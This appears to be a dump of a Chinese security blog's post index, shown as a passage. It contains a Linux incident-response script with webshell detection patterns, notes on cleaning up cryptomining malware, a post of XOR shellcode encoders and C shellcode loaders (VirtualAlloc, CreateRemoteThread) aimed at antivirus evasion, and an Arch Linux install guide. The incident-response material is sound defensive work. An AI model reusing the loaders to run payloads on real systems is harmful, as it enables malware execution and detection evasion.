&quot;若发现恶意进程，请用ls -l /proc/pid 查看进程相关目录&quot; echo ---------------------------------------------------------- echo &quot;耗CPU最多的进程（前5）&quot; ps auxf|head -1;ps auxf|grep -v PID|sort -rn -k 3|head -5 echo ---------------------------------------------------------- echo &quot;耗内存最多的进程&quot; ps auxf|head -1;ps auxf|grep -v PID|sort -nr -k 4 |head -5 #ls -l /proc/pid echo ---------------------------------------------------------- echo &quot;计划任务&quot; crontab -l # 查看当前用户的计划任务 crontab -l -u root # 查看root用户的计划任务 echo ---------------------------------------------------------- awk -F&quot;:&quot; '{if($2!~/^!|^*/){print &quot;(&quot;$1&quot;)&quot; &quot; 是一个未被锁定的账户，请管理员检查是否需要锁定它或者删除它。&quot;}}' /etc/shadow echo ---------------------------------------------------------- echo &quot;查看系统密码文件修改时间&quot; ls -ltr /etc/passwd echo ---------------------------------------------------------- echo &quot;查看系统中存在哪些非系统默认用户&quot; echo &quot;root:x:“该值大于500为新创建用户，小于或等于500为系统初始用户”&quot; more /etc/passwd |awk -F &quot;:&quot; '{if($3&gt;500){print &quot;/etc/passwd里面的&quot;$1 &quot;的值为&quot;$3&quot;，请管理员确认该账户是否正常。&quot;}}' echo ---------------------------------------------------------- echo &quot;查看是否开启了ssh服务&quot; if service sshd status | grep -E &quot;running|listening on|active \\(running\\)&quot;; then echo &quot;SSH服务已开启&quot; ls -l ~/.ssh/authorized_keys else echo &quot;SSH服务未开启&quot; fi echo ---------------------------------------------------------- echo &quot;查看系统SSH远程访问设置策略(hosts.allow允许列表)&quot; if more /etc/hosts.allow | grep -E &quot;sshd: &quot;;more /etc/hosts.allow | grep -E &quot;sshd&quot;; then echo &quot;远程访问策略已设置 &quot; else echo &quot;远程访问策略未设置 &quot; fi echo ---------------------------------------------------------- echo &quot;查看是否开启了TELNET服务&quot; if more /etc/xinetd.d/telnetd 2&gt;&amp;1|grep -E &quot;disable=no&quot;; then echo &quot;TELNET服务已开启 &quot; else echo &quot;TELNET服务未开启 &quot; fi echo ---------------------------------------------------------- echo &quot;查看syslog日志是否开启外发&quot; if more /etc/rsyslog.conf | egrep &quot;@...\\.|@..\\.|@.\\.|\\*.\\* @...\\.|\\*\\.\\* @..\\.|\\*\\.\\* @.\\.&quot;;then echo &quot;客户端syslog日志已开启外发&quot; else echo &quot;客户端syslog日志未开启外发&quot; fi echo ---------------------------------------------------------- echo &quot;查看系统日志文件是否存在&quot; log=/var/log/syslog log2=/var/log/messages log3=/var/log/cron log4=~/.bash_history log5=/var/log/secure if [ -e &quot;$log&quot; ]; then echo &quot;syslog日志文件存在！ &quot; else echo &quot;/var/log/syslog日志文件不存在！ &quot; fi if [ -e &quot;$log2&quot; ]; then echo &quot;/var/log/messages日志文件存在！ &quot; else echo &quot;/var/log/messages日志文件不存在！ &quot; fi if [ -e &quot;$log3&quot; ]; then echo &quot;/var/log/cron日志文件存在！ &quot; else echo &quot;/var/log/cron日志文件不存在！ &quot; fi echo ---------------------------------------------------------- echo &quot;查看passwd文件中有哪些特权用户&quot; awk -F: '$3==0 {print $1}' /etc/passwd echo ---------------------------------------------------------- echo &quot;查看系统中是否存在空口令账户&quot; awk -F: '($2==&quot;!!&quot;) {print $1}' /etc/shadow echo &quot;该结果不适用于Ubuntu系统&quot; echo ----------------------------------------------------------- echo &quot;查看系统中root用户外连情况&quot; lsof -u root |egrep &quot;ESTABLISHED|SYN_SENT|LISTENING&quot; echo ---------------状态解释------------------------------- echo &quot;ESTABLISHED的意思是建立连接。表示两台机器正在通信。&quot; echo &quot;LISTENING表示监听状态&quot; echo &quot;SYN_SENT表示请求连接&quot; echo ---------------------------------------------------------- echo &quot;查看系统中root用户TCP连接情况&quot; lsof -u root |egrep &quot;TCP&quot; echo ---------------------------------------------------------- echo &quot;检查系统守护进程&quot; more /etc/xinetd.d/rsync | grep -v &quot;^#&quot; echo ---------------------------------------------------------- echo &quot;/root目录&quot; ls -l /tmp echo ---------------------------------------------------------- echo &quot;/tmp目录&quot; ls -l /tmp echo ---------------------------------------------------------- echo &quot;/var/log/目录&quot; ls -l /var/log/ echo ---------------------------------------------------------- echo &quot;secure历史密码错误次数&quot; grep -c &quot;authentication failure&quot; /var/log/secure* echo ---------------------------------------------------------- echo &quot;检查secure近期登录成功日志（旧的不在此范围）&quot; more /var/log/secure |grep &quot;Accepted password&quot; echo &quot;secure历史登录成功记录，输出到/tmp/secure-logined.log&quot; grep &quot;Accepted password&quot; /var/log/secure* &gt;/tmp/secure-logined.log echo ---------------------------------------------------------- echo &quot;history历史命令&quot; history echo ---------------------------------------------------------- echo &quot;查看正常情况下登录到本机的所有用户的历史记录&quot; last echo ---------------------------------------------------------- echo &quot;-------查找最近一天被修改的PHP文件--------&quot; find -mtime -1 -type f -name ＼*.php echo ---------------------------------------------------------- echo &quot;-------隐藏进程查找---------&quot; ps -ef |awk '{print}'|sort -n |uniq &gt;1 echo ---------------------------------------------------------- echo &quot;-------查找最近一天被修改的任意文件--------&quot; find -mtime -1 -type f -name ＼*.* echo ---------------------------------------------------------- echo &quot;检查系统中关键文件修改时间&quot; ls -ltr /bin/ls /bin/login /etc/passwd /bin/ps /usr/bin/top /etc/shadow|awk '{print &quot;文件名：&quot;$9&quot; &quot;&quot;最后修改时间：&quot;$6&quot; &quot;$7&quot; &quot;$8}' echo &quot;ls文件：是存储ls命令的功能函数，被删除以后，就无法执行ls命令，黑客可利用篡改ls文件来执行后门或其他程序。 login文件：login是控制用户登录的文件，一旦被篡改或删除，系统将无法切换用户或登陆用户 user/bin/passwd是一个命令，可以为用户添加、更改密码，但是，用户的密码并不保存在/etc/passwd当中，而是保存在了/etc/shadow当中 etc/passwd是一个文件，主要是保存用户信息。 sbin/portmap是文件转换服务，缺少该文件后，无法使用磁盘挂载、转换类型等功能。 bin/ps 进程查看命令功能支持文件，文件损坏或被更改后，无法正常使用ps命令。 usr/bin/top top命令支持文件，是Linux下常用的性能分析工具,能够实时显示系统中各个进程的资源占用状况。 etc/shadow shadow 是 /etc/passwd 的影子文件，密码存放在该文件当中，并且只有root用户可读。&quot; echo ---------------------------------------------------------- echo &quot;--------检查系统是否存在PHP脚本后门---------------------&quot; if find / -type f -name *.php | xargs egrep -l &quot;专用网马|udf.dll|class PHPzip|ZIP压缩程序 荒野无灯修改版|AnonymousUserName|Root_CSS\\(\\)|黑狼PHP木马|eval\\(gzuncompress\\(base64_decode|shell|Shell|PHP木马|eval\\($_POST|eval\\($_GET|system\\($_REQUEST|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|提权|phpspy|后门|substr\\(PHP_OS|is_callable\\(|backdoor|博彩&quot; |sort -n|uniq -c |sort -rn 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;检测到PHP脚本后门&quot; find / -type f -name *.php | xargs egrep -l &quot;专用网马|udf.dll|class PHPzip|ZIP压缩程序 荒野无灯修改版|AnonymousUserName|Root_CSS\\(\\)|黑狼PHP木马|eval\\(gzuncompress\\(base64_decode|shell|Shell|PHP木马|eval\\($_POST|eval\\($_GET|system\\($_REQUEST|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|提权|phpspy|后门|substr\\(PHP_OS|is_callable\\(|backdoor|博彩&quot; |sort -n|uniq -c |sort -rn find / -type f -name *.php | xargs egrep -l &quot;专用网马|udf.dll|class PHPzip|ZIP压缩程序 荒野无灯修改版|AnonymousUserName|Root_CSS\\(\\)|黑狼PHP木马|eval\\(gzuncompress\\(base64_decode|shell|Shell|PHP木马|eval\\($_POST|eval\\($_GET|system\\($_REQUEST|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|提权|phpspy|后门|substr\\(PHP_OS|is_callable\\(|backdoor|博彩&quot; |sort -n|uniq -c |sort -rn |awk '{print $2}' | xargs -I{} cp {} /tmp/ echo &quot;后门样本已拷贝到/tmp/目录&quot; else echo &quot;未检测到PHP脚本后门&quot; fi echo ---------------------------------------------------------- echo &quot;---------检查系统是否存在JSP脚本后门---------------------&quot; if find / -type f -name *.jsp | xargs egrep -l &quot;java.io.FileOutputStream\\(application.getRealPath|request.getParameter\\(\\&quot;pass|exec\\(request.getParameter\\(|InputStreamReader\\(this.is\\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|提权|jspspy|后门|JFolder|backdoor|博彩&quot; 2&gt;&amp;1;then echo &quot;检测到JSP脚本后门&quot; find / -type f -name *.jsp | xargs egrep -l &quot;java.io.FileOutputStream\\(application.getRealPath|request.getParameter\\(\\&quot;pass|exec\\(request.getParameter\\(|InputStreamReader\\(this.is\\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|提权|jspspy|后门|JFolder|backdoor|博彩&quot; |sort -n|uniq -c |sort -rn find / -type f -name *.jsp | xargs egrep -l &quot;java.io.FileOutputStream\\(application.getRealPath|request.getParameter\\(\\&quot;pass|exec\\(request.getParameter\\(|InputStreamReader\\(this.is\\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|提权|jspspy|后门|JFolder|backdoor|博彩&quot; |sort -n|uniq -c |sort -rn| awk '{print $2}' | xargs -I{} cp {} /tmp/ echo &quot;后门样本已拷贝到/tmp/目录&quot; else echo &quot;未检测到JSP脚本后门&quot; fi echo ---------------------------------------------------------- echo &quot;--------检查系统是否存在HTML恶意代码---------------------&quot; if find / -type f -name *.html | xargs egrep -l &quot;hack|WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330|博彩|script src=\\&quot;http&quot; 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;发现HTML恶意代码&quot; find / -type f -name *.html | xargs egrep -l &quot;WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330|博彩|script src=\\&quot;http&quot; |sort -n|uniq -c |sort -rn find / -type f -name *.html | xargs egrep -l &quot;WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330|博彩|script src=\\&quot;http&quot; |sort -n|uniq -c |sort -rn| awk '{print $2}' | xargs -I{} cp {} /tmp/ echo &quot;HTML恶意文件已拷贝到/tmp/目录&quot; else echo &quot;未检测到HTML恶意代码&quot; fi echo ---------------------------------------------------------- echo &quot;--------检查系统是否存在perl恶意程序--------------------&quot; if find / -type f -name *.pl | xargs egrep -l &quot;SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;&quot; 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;发现perl恶意程序&quot; find / -type f -name *.pl | xargs egrep -l &quot;SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;&quot;|sort -n|uniq -c |sort -rn find / -type f -name *.pl | xargs egrep -l &quot;SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;&quot;|sort -n|uniq -c |sort -rn| awk '{print $2}' | xargs -I{} cp {} /tmp/ echo &quot;可疑样本已拷贝到/tmp/目录&quot; else echo &quot;未检测到perl恶意程序&quot; fi echo ---------------------------------------------------------- echo &quot;--------检查系统是否存在Python恶意程序-------------&quot; find / -type f -name &quot;*.py&quot; | xargs egrep -l &quot;execCmd|cat /etc/issue|getAppProc|exploitdb|exec\\(base64&quot; |sort -n|uniq -c |sort -rn find / -type f -name &quot;*.py&quot; | xargs egrep -l &quot;execCmd|cat /etc/issue|getAppProc|exploitdb|exec\\(base64&quot; |sort -n|uniq -c |sort -rn| awk '{print $2}' | xargs -I{} cp {} /tmp/ echo ---------------------------------------------------------- echo &quot;-----------开始检查系统是否存在易受攻击的漏洞---------------------&quot; if ps aux | grep &quot;httpd|apache|tomcat|nginx&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;httpd|apache|tomcat|nginx&quot; | grep -v grep echo &quot;Web服务运行中&quot; else echo &quot;未发现 httpd|apache|tomcat|nginx&quot;; fi echo ---------------------------------------------------------- echo &quot;-----------检查系统是否存在redis未授权访问漏洞---------------------&quot; if ps aux | grep &quot;redis&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;redis&quot; | grep -v grep echo &quot;存在redis服务&quot; echo &quot;开始检查redis配置安全&quot; find / -name redis.conf | xargs egrep &quot;requirepass |^[^#]*bind |^[^#]*port &quot; else echo &quot;未发现使用redis服务&quot;; fi echo ---------------------------------------------------------- echo &quot;-----------检查系统是否存在docker未授权访问漏洞---------------------&quot; if ps aux | grep &quot;docker&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;docker&quot; | grep -v grep echo &quot;docker运行中，默认2375端口，可能存在Docker remote api未授权访问漏洞！&quot;; else echo &quot;未发现对外开放docker服务&quot;; fi echo ---------------------------------------------------------- echo &quot;-----------检查系统是否存在Memcache未授权访问漏洞---------------------&quot; if ps aux | grep &quot;memcache|:11211&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;memcache&quot; | grep -v grep echo &quot;开放了11211端口，可能存在Memcache未授权访问漏洞！&quot;; else echo &quot;未发现对外开放Memcache服务&quot;;fi echo ---------------------------------------------------------- echo &quot;-----------检查系统是否存在Zookeeper未授权访问漏洞---------------------&quot; if ps aux | grep &quot;zookeeper|:2181&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;zookeeper|:2181&quot; | grep -v grep echo &quot;开放了2181端口，可能存在zookeeper未授权访问漏洞！&quot;; else echo &quot;未发现对外开放zookeeper服务&quot;;fi echo ---------------------------------------------------------- echo &quot;-----------检查系统是否存在elasticsearch未授权访问漏洞---------------------&quot; if ps aux | grep &quot;:9200|elasticsearch&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;:9200|elasticsearch&quot; | grep -v grep echo &quot;开放了9200端口，可能存在elasticsearch未授权访问漏洞！&quot;; else echo &quot;未发现对外开放elasticsearch服务&quot;;fi echo ---------------------------------------------------------- echo &quot;-----------检查系统是否存在hadoop未授权访问漏洞---------------------&quot; if ps aux | grep &quot;:50070|hadoop&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;:50070|hadoop&quot; | grep -v grep echo &quot;开放了50070端口，可能存在hadoop未授权访问漏洞！&quot;; else echo &quot;未发现对外开放hadoop服务&quot;; fi echo ---------------------------------------------------------- echo &quot;-----------检查系统是否存在jenkins未授权访问漏洞---------------------&quot; if ps aux | grep jenkins | grep -v grep 1&gt;/dev/null 2&gt;&amp;1 ;then echo &quot;存在jenkins服务！&quot; ps aux | grep jenkins | grep -v grep if netstat -tulnp | egrep &quot;:8080|jenkins&quot; 1&gt;/dev/null 2&gt;&amp;1; then echo &quot;开始检查jenkins未授权访问漏洞&quot; if wget -q -O - http://127.0.0.1:8080/script | grep &quot;Groovy script&quot; 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;存在jenkins未授权访问漏洞！&quot;; else echo &quot;不存在jenkins未授权访问漏洞&quot;; fi else echo &quot;服务为本地使用，无法远程访问。&quot; fi else echo &quot;未发现使用jenkins服务&quot;; fi echo ---------------------------------------------------------- echo &quot;-----------检查系统是否存在MongoDB未授权访问漏洞---------------------&quot; if ps aux | grep &quot;mongodb|:27017&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;mongodb|:27017&quot; | grep -v grep echo &quot;开放了27017端口，可能存在MongoDB未授权访问漏洞！&quot;; else echo &quot;未发现对外开放MongoDB服务&quot;; fi echo ---------------------------------------------------------- echo &quot;-----------检查系统是否存在CouchDB未授权访问漏洞---------------------&quot; if ps aux | grep &quot;5984|couchdb&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;5984|couchdb&quot; | grep -v grep echo &quot;开放了5984端口，可能存在CouchDB未授权访问漏洞！&quot; echo &quot;开始检查CouchDB配置安全&quot; find / -name local.ini | head -1 |xargs grep &quot;admin&quot; else echo &quot;未发现使用CouchDB服务&quot;; fi echo ---------------------------------------------------------- echo &quot;-----------检查系统是否存在apache tomcat相关安全漏洞---------------------&quot; #还需看后续怎么完善 if ps aux | grep &quot;tomcat|httpd&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;存在apache tomcat服务！&quot; ps aux | grep &quot;tomcat|httpd&quot; | grep -v grep echo &quot;开始检查apache tomcat配置安全&quot; echo &quot;检查是否存在tomcat口令配置&quot; find / -name tomcat-users.xml | xargs grep -C 3 &quot;username=&quot; echo &quot;检查是否存在任意文件上传漏洞&quot; find / -name web.xml | head -1 | xargs grep &quot;readonly&quot; else echo &quot;未发现存在apache tomcat服务&quot; fi echo ---------------------------------------------------------- echo &quot;-----------检查系统是否存在weblogic相关安全漏洞---------------------&quot; #还需看后续怎么完善 if ps aux | grep weblogic | grep -v grep 1&gt;/dev/null 2&gt;&amp;1 ;then echo &quot;存在weblogic服务！&quot; ps aux | grep weblogic | grep -v grep if netstat -tulnp | egrep &quot;:7001&quot; 1&gt;/dev/null 2&gt;&amp;1; then echo &quot;开始检查可能存在的漏洞！&quot;; if wget -q -O - http://127.0.0.1:7001/wls-wsat/CoordinatorPortType | grep &quot;weblogic.wsee.wstx.wsat.v10.endpoint.CoordinatorPortTypePortImpl&quot; 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;存在CVE-2017-10271漏洞！&quot;; else echo &quot;未发现CVE-2017-10271漏洞！&quot;; fi if ( wget -q -O - http://127.0.0.1:7001/ws_utc/begin.do ) 1&gt;/dev/null 2&gt;&amp;1 || ( wget -q -O - http://127.0.0.1:7001/ws_utc/config.do ) 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;存在CVE-2018-2894漏洞！&quot;; else echo &quot;未发现CVE-2018-2894漏洞！&quot;; fi if wget -q -O - http://127.0.0.1:7001/_async/AsyncResponseService | grep &quot;AsyncResponseService home page&quot; 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;存在CNVD-C-2019-48814漏洞！&quot;; else echo &quot;未发现CNVD-C-2019-48814漏洞！&quot;; fi else echo &quot;服务为本地使用，无法远程访问。&quot;; fi else echo &quot;未发现使用weblogic服务&quot;; fi echo ---------------------运行完毕------------------------ 挖矿木马 挖矿病毒一般通过敏感端口，3306，22，23等或利用一些简单漏洞如weblogic，jboss反序列化等（因为挖矿团伙一般追求数量和速度，所以一般不会通过一些复杂的漏洞入侵） 职业化的挖矿一般会通过伪装进程，加壳，代码混淆，私搭矿池或代理的手段来规避安全分析与溯源。挖矿病毒往往会通过crontab设置周期性被执行的指令来保证能够在受害主机上持久化驻留。 挖矿排查 挖矿处置思路：隔离主机 -&gt;阻断异常通信-&gt;清除计划任务-&gt;清除启动项-&gt;排查文件-&gt;清理木马-&gt;分析溯源处理 快速响应思路：查进程-&gt;找挖矿文件路径-&gt;删进程，删文件-&gt;溯源排查 进程排查 top -c #查看cpu占比最高的进程pid ps aux | less systemctl status $PID #排查有无守护进程 异常连接排查 iptables -L -n netstat -natp | grep $PID 计划任务排查 crontab -l #centos7有记录 crontab 日志 cd /var/log cat cron* | grep RELOAD 启动项排查 /usr/lib/systemd/system /usr/lib/systemd/system/multi-user.target.wants /etc/rc.local /etc/inittab /etc/rc0.d/ /etc/rc1.d/ /etc/rc2.d/ /etc/rc3.d/ /etc/rc4.d/ /etc/rc5.d/ /etc/rc6.d/ /etc/rc.d/ 获取挖矿文件路径 ls -l /proc/$PID/exe 进程处置 kill -9 $PID #删除挖矿进程 ps -ef | grep &quot;$关键字&quot; |awk &quot;{pint $2}&quot; | xargs pkill #删除挖矿家族所有进程及守护进程 文件处置 rm -rf $FILE #删除挖矿文件 find / -name &quot;$FILE*&quot; | xargs rm -rf #当文件被赋予a i 属性无法rm时 chattr -a -i $FILE rm -rf $FILE 2&gt;/dev/null 计划任务清理 vi /etc/crontab crontab -e #root权限执行 清理启动项 system disable 服务名（centOS7以上） chkconfig 服务名 off（centOS7以下） 挖矿处理tips 定时任务有时手动删了还是没用，说明其有守护进程去监控定时任务的状态 可以用top监控内存，一删掉定时任务 crontab -r(删除所有定时任务)，top 里就发现有进程的cpu在跳动，重点排查这个进程 挖矿团伙使用的恶意脚本往往经过各种混淆,在清理时可以保留样本以供分析 挖矿木马家族 SMBGhost挖矿 入侵手段 入侵系统 windows linux 入侵方式 Lnk漏洞cve-2017-8464(移动设备) ssh爆破 Hadoop Yarn未授权访问 RDP爆破 永恒之蓝ms17-010 $IPC爆破 SMB爆破 redis未授权访问 mssql爆破 office漏洞cve-2017-8570(钓鱼邮件) SMBGhost漏洞cve-2020-0796 受感染文件 /etc/crontab /var/spool/cron/'whoami' kdevtmpfsi挖矿 入侵手段 windows linux Lnk漏洞cve-2017-8464(移动设备) ssh爆破 永恒之蓝ms17-010 RDP爆破 SMB爆破 $IPC爆破 mssql爆破 redis未授权访问 Hadoop Yarn未授权访问 1 office漏洞cve-2017-8570(钓鱼邮件) SMBGhost漏洞cve-2020-0796 受感染文件 /var/tmp/kinsing /tmp/kdevtmpfsi /var/spool/cron/'whoami' /tmp/dark.x86 /tmp/dark.x86.1 DDG 挖矿 入侵手段 入侵方式 Orientdb 漏洞（早期） Redis 未授权访问漏洞 SSH 弱密码 受感染文件 imWBR1(挖矿程序) wnTKYg 2t3ik qW3xT 8220 挖矿 入侵手段 入侵方式 WebLogic XMLDecoder 反序列化漏洞 Drupal 远程代码执行漏洞 JBoss 反序列化命令执行漏洞 Couchdb 的组合漏洞 Redis 未授权访问 Hadoop Yarn 未授权访问漏洞 受感染文件 wc.conf(配置文件) sutse（挖矿程序） Mykings(theHidden)挖矿 入侵手段 入侵方式 3306 MySQL 135 WMI 22 SSH 445 IPC 23 Telnet 80 Web 3389 RDP 受感染文件 msinfo.exe ups.rar(持久化文件) lsmose.exe(挖矿程序) Web日志分析 Apache日志 apache日志分为access_log和error_log access_log记录对apache服务器的请求访问 error_log记录错误请求 默认位置： /var/log/apache2 Ngnix日志 ngnix日志分为access.log和error.log access.log记录访问日志 error.log记录错误信息 默认位置：/var/log/ngnix iis日志 默认位置：C:\\WINDOWS\\system32\\LogFiles Tomcat日志 tomcat日志分为catalina.out,localhost,manager,local_access_log catalina.out记录运行中异常错误等 localhost.Y-M-D.log记录内部代码异常日志 manager.Y-M-D.log记录管理日志 localhost_access_log记录访问日志 默认位置：/tomcat/log weblogic日志 weblogic日志分为access.log，Server.log，domain.log access.log记录http请求 sever.log记录启动，关闭，部署信息 domain.log记录doain的运行情况 分析技巧 find / -name &quot;*.log&quot;|xargs grep &quot;webshell&quot; #查询websell何时被上传的进行进一步溯源 勒索溯源 确认勒索病毒种类 &lt;样本搜索确认&gt; https://lesuobingdu.360.cn/ &lt;360勒索病毒搜索引擎&gt; https://guanjia.qq.com/pr/ls/ &lt;腾讯勒索病毒搜索引擎&gt; https://lesuo.venuseye.com.cn/ &lt;VenusEye勒索病毒搜索引擎&gt; https://lesuobingdu.qianxin.com/ &lt;qax勒索病毒的搜索引擎&gt; https://edr.sangfor.com.cn/#/information/ransom_search &lt;sangfor勒索病毒搜索引擎&gt; 解密勒索文件 https://github.com/jiansiting/Decryption-Tools &lt;解密脚本查找&gt; 分析溯源 恶意邮件 发件人分析 nslookup -type=mx xxx.com #mx记录查询 ","link":"https://Zer0-hex.github.io/linux-ying-ji-xiang-ying/"},{"title":"C语言常见Shellcode加载器","content":"Python简单实现对Shellcode的XOR加密 shellcode = &quot;&quot; # \\xfc\\x48\\x83\\xe4...... for i, n in enumerate(shellcode): temp = ord(n) ^ (i % 73) print('0x%.2x, ' % temp, end='') if i % 16 == 15: print() C语言加载 指针调用 #include&lt;stdio.h&gt; #include&lt;windows.h&gt; unsigned char shellcode[1024] = { // 0xfc, 0x49, 0x81, 0xe7, 0xf4, 0xed...... }; void init() { for (int i=0; i &lt; sizeof(shellcode); i++) { shellcode[i] ^= (i % 73); } } void print_shellcode() { for(int i=0; i &lt; sizeof(shellcode); i++) { printf(&quot;0x%.2x, &quot;, shellcode[i]); if (i % 16 == 15) { printf(&quot;\\n&quot;); } } } int main(void) { init(); print_shellcode(); exec = VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof(shellcode)); printf(&quot;[+] exec start...\\n&quot;); (*(void(*)())exec)(); printf(&quot;[-] exec end...\\n&quot;); return 0; } Remote thread Loader #include &lt;windows.h&gt; #include &lt;stdio.h&gt; unsigned char shellcode[1024] = { //0xfc, 0x49, 0x81, 0xe7, 0xf4...... }; void init() { for (int i=0; i &lt; sizeof(shellcode); i++) { shellcode[i] ^= (i % 73); } } void print_shellcode() { for(int i=0; i &lt; sizeof(shellcode); i++) { printf(&quot;0x%.2x, &quot;, shellcode[i]); if (i % 16 == 15) { printf(&quot;\\n&quot;); } } } int main(void) { init(); print_shellcode(); HANDLE hProc = (HANDLE)-1; PVOID pAddress = VirtualAllocEx(hProc, NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hProc, pAddress, shellcode, sizeof(shellcode), NULL); HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pAddress, NULL, NULL, NULL); printf(&quot;[+] Wait thread...\\n&quot;); WaitForSingleObject(hThread, INFINITE); printf(&quot;[-] Thread exit...\\n&quot;); return 0; } ","link":"https://Zer0-hex.github.io/c-yu-yan-chang-jian-shellcode-jia-zai-qi/"},{"title":"Arch Linux 安装","content":"Arch Linux installation 请配合 Arch Wiki 进行安装配置 镜像 到各大镜像站均可下载镜像。清华大学开源软件镜像站 使用刻录工具刻录至U盘。Rufus、dd(Linux工具) 进入BIOS系统，关闭安全启动(Secure Boot) 启动到Live环境 检查网络 有线网络检查是否连接成功 # ip link # ip addr # ping -c 4 archlinux.org 无线网络使用iwctf配置wifi # iwctl [iwd]# device list # 显示设备列表，我的设备名为wlan0 [iwd]# station wlan0 scan # 扫描wifi [iwd]# station wlan0 get-networks # 获取wifi信息 [iwd]# station wlan0 connect [wifi名称] # 连接wifi 更新时间 # timedatectl set-ntp true 更换软件源 切换镜像源 # reflector --country China --age 24 --sort rate --protocol https --save /etc/pacman.d/mirrorlist # pacman -Syy 磁盘分区 查看磁盘 # lsblk # 查看磁盘名称 NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS nvme0n1 259:0 0 476.9G 0 disk ├─nvme0n1p1 259:1 0 512M 0 part /boot/efi ├─nvme0n1p2 259:2 0 10G 0 part [SWAP] └─nvme0n1p3 259:3 0 466.4G 0 part / # gdisk /dev/nvme0n1 # 使用磁盘分区工具gdisk对需要安装系统的磁盘进行操作 # cfdisk /dev/nvme0n1 # 在命令行有图形界面的分区工具 固态硬盘一般为nvme0n1、nvme0n2，机械硬盘一般为sda、sdb。 分区操作 挂载点 大小 类型 /boot/efi 512MB 引导分区（vfat） swap RAM * 1.1 逻辑分区（swap） / 剩余空间 主分区（xfs、btrfs、ext4三选一） 关于文件系统，不太靠谱的解释：xfs(大文件存储效率高)、btrfs(压缩式存储)、ext4(看不懂就用这个) 格式化分区 我的分区如下： 引导分区：/dev/nvme0n1p1 逻辑分区：/dev/nvme0n1p2 主分区：/dev/nvme0n1p3 # mkfs.vfat /dev/nvme0n1p1 # 格式化引导分区 # mkfs.ext4(xfs/btrfs) /dev/nvme0n1p3 # 格式化主分区 # mkswap /dev/nvme0n1p2 # 初始化逻辑分区 挂载分区 # mount /dev/nvme0n1p3 /mnt # 挂载主目录到/mnt # mkdir -p /mnt/boot/efi # 给引导分区创建文件夹 # mount /dev/nvme0n1p1 /mnt/boot/efi # 挂载引导分区 # swapon /dev/nvme0n1p2 # 启用swap分区 安装系统 安装基本系统以及部分工具 # pacstrap /mnt base linux linux-firmware linux-headers base-devel neovim bash-completion 生成文件系统表 # genfstab -U /mnt &gt;&gt; /mnt/etc/fstab # cat /mnt/etc/fstab 配置系统 利用arch-chroot进入系统 # arch-chroot /mnt 安装引导、网络、平台相关软件包 # pacman -Syy grub efibootmgr efivar networkmanager amd-ucode(英特尔处理器用intel-ucode) 安装引导 # grub-install /dev/nvme0n1p1(引导分区) # grub-mkconfig -o /boot/grub/grub.cfg 开启网络服务 # systemctl enable NetworkManager 修改root用户密码 # passwd 这里由于安装的编辑器是neovim，而又常常使用vim，所以建立一个链接 sudo ln -s /usr/bin/nvim /usr/bin/vim 卸载已挂载的分区 # exit退出至live系统 # umount /mnt/boot/efi # umount /mnt # reboot(重启并移除安装介质) 完善系统 连接网络 # nmtui 修改主机名等信息(此处主机名为arch) # vim /etc/hostname ------------------- arch # vim /etc/hosts ---------------- 127.0.0.1 localhost ::1 localhost 127.0.0.1 arch.localdomain arch 设置时间 # timedatectl set-timezone Asia/Shanghai # 设置时区 # timedatectl set-ntp true # 设置时间同步 # timedatectl status # 查看状态 配置bash环境变量(修改/etc/sk) # # If not running interactively, don't do anything [[ $- != *i* ]] &amp;&amp; return export EDITOR=vim alias ls='ls --color=auto' alias grep='grep --color=auto' alias egrep='egrep --color=auto' alias fgrep='fgrep --color=auto' [ ! -e ~/.dircolors ] &amp;&amp; eval $(dircolors -p &gt; ~/.dircolors) [ -e /bin/dircolors ] &amp;&amp; eval $(dircolors -b ~/.dircolors) PS1='[\\u@\\h \\W]\\$ ' 添加普通用户(lun) # useradd -d lun # passwd 